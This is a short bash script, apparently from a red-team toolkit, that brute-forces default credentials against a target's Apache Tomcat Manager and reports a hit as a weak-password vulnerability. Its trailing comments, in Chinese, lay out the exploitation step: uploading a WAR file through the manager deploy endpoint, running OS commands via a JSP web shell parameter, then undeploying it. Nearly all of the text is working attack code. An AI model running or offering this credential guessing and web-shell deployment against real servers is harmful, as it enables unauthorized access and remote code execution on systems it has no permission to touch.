#!/usr/bin/env bash
TARGET="${1:?usage: bash tomcat.sh http://TARGET:8080}"
B="${TARGET%/}"
curl -sS -m 8 -o /dev/null -w 'manager=%{http_code}\n' "$B/manager/html"
for cred in tomcat:tomcat tomcat:s3cret admin:admin admin:123456 manager:manager tomcat:123456; do
  code=$(curl -sS -m 8 -u "$cred" -o runs/tomcat-${cred%%:*}.html -w '%{http_code}' "$B/manager/html")
  echo "$code  $cred"
  if [ "$code" = "200" ] && grep -qi 'Tomcat Web Application Manager' "runs/tomcat-${cred%%:*}.html"; then
    echo "VULN 弱口令: $cred"; exit 0
  fi
done
echo "SAFE/未命中"; exit 1
# 利用（利用阶段，落到 /rtprobe 便于清理）：
#   curl -u USER:PASS -T runs/rtprobe.war "$B/manager/text/deploy?path=/rtprobe&update=true"
#   curl "$B/rtprobe/rtprobe.jsp?c=id"
#   curl -u USER:PASS "$B/manager/text/undeploy?path=/rtprobe"
